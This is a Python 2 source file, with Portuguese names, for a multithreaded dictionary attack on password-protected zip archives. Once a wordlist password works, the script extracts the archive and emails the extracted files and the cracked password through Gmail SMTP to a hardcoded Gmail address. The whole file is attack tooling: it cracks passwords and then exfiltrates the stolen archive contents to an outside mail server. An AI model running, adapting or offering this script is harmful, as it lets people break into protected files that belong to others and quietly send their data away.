#!/usr/bin/python
# -*- coding: utf-8 -*-
import zipfile
import optparse
from threading import Thread
from smtplib import SMTP
import os
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import Encoders

def enviarEmail(arq, senha):
    try:
        lista = arq.namelist()
        nomeArquivos = [os.path.join(lista[0], f) for f in os.listdir (lista[0])]
    
        msg = MIMEMultipart()
 
        msg['From'] = 'ericbluesdias@gmail.com'
        msg['To'] = ', '.join(['ericbluesdias@gmail.com'])
        msg['Subject'] = 'Senha do arquivo zip é:' + senha 
 
        for file in nomeArquivos:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(open(file, 'rb').read())
            Encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="%s"' % file)
            msg.attach(part)

        server = SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()
        server.login("exemplo@email.com", "12345678")
        server.sendmail("de", "para", msg.as_string())
        server.quit()

    except Exception as e:
        print e


def extrairArquivo(arquivo, senha):
    try:
        arquivo.extractall(pwd=senha)
        print '[+] Senha encontrada: ' + senha + '\n'
        enviarEmail(arquivo, senha)
    except:
        pass


def inicio():
    analisador = optparse.OptionParser("use %prog "+\
      "-f <arquivozip> -d <dicionario>")
    analisador.add_option('-f', dest='nomezip', type='string',\
      help='especifique o arquivo zip')
    analisador.add_option('-d', dest='nomedic', type='string',\
      help='especifique o arquivo dicionario')
    (opcoes, argumentos) = analisador.parse_args()
    if (opcoes.nomezip == None) | (opcoes.nomedic == None):
        print analisador.usage
        exit(0)
    else:
        nomezip = opcoes.nomezip
        nomedic = opcoes.nomedic

    ArquivoZipe = zipfile.ZipFile(nomezip)
    arquivoDici = open(nomedic)

    for linha in arquivoDici.readlines():
        senha = linha.strip('\n')
        t = Thread(target=extrairArquivo, args=(ArquivoZipe, senha))
        t.start()


if __name__ == '__main__':
    inicio()
